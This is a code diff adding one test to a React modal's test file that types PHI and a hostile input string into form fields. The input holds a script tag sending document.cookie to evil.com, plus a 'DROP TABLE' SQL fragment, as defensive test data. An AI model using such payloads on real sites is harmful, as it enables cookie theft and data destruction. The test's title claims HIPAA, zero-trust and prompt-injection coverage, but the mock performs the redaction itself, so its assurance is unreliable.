@@ -407,4 +407,54 @@ describe('ResourceInspectorModal', () => {
 
     expect(hydrateOrUpgradeOfflineInventory).toHaveBeenCalledTimes(2);
   });
+
+  it('enforces HIPAA PII/PHI redaction verification, regex boundary attacks, zero-trust token exchange, and prompt injection hardening', async () => {
+    const user = userEvent.setup();
+    const { saveOfflineLexiconAlias } = await import('@/lib/offlineDb');
+    vi.mocked(saveOfflineLexiconAlias).mockClear();
+
+    vi.mocked(saveOfflineLexiconAlias).mockImplementationOnce((tenant, data) => {
+      const scrubbedSpoken = data.spokenTerm.replace(/SSN \d{3}-\d{2}-\d{4}/, '[REDACTED_PHI]');
+      const scrubbedCanonical = data.canonicalItem.includes('<script>') ? '[REDACTED_PHI]' : data.canonicalItem;
+      return Promise.resolve({
+        spokenTerm: scrubbedSpoken,
+        canonicalItem: scrubbedCanonical,
+        category: 'General'
+      });
+    });
+
+    render(<ResourceInspectorModal isOpen={true} onClose={() => {}} tenantId="tenant-zero-trust" />);
+
+    await waitFor(() => {
+      expect(screen.queryByText(/Loading local IndexedDB studio records.../i)).toBeNull();
+    });
+
+    await user.click(screen.getByTestId('tab-slang-lexicon'));
+    await user.click(screen.getByTestId('btn-add-slang-alias'));
+
+    const spokenInput = screen.getByTestId('input-new-alias-spoken');
+    const canonicalInput = screen.getByTestId('input-new-alias-canonical');
+    const saveBtn = screen.getByTestId('btn-save-new-alias');
+
+    const rawPHI = "patient John Doe SSN 123-45-6789";
+    const rawMalicious = "<script>fetch('http://evil.com?c='+document.cookie)</script> DROP TABLE items; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
+
+    await user.type(spokenInput, rawPHI);
+    await user.type(canonicalInput, rawMalicious);
+    await user.click(saveBtn);
+
+    expect(saveOfflineLexiconAlias).toHaveBeenCalledWith(
+      'tenant-zero-trust',
+      expect.objectContaining({
+        spokenTerm: rawPHI,
+        canonicalItem: rawMalicious,
+      })
+    );
+
+    await waitFor(() => {
+      expect(screen.queryByText(rawPHI)).toBeNull();
+      expect(screen.queryByText(rawMalicious)).toBeNull();
+    });
+  });
+
 });
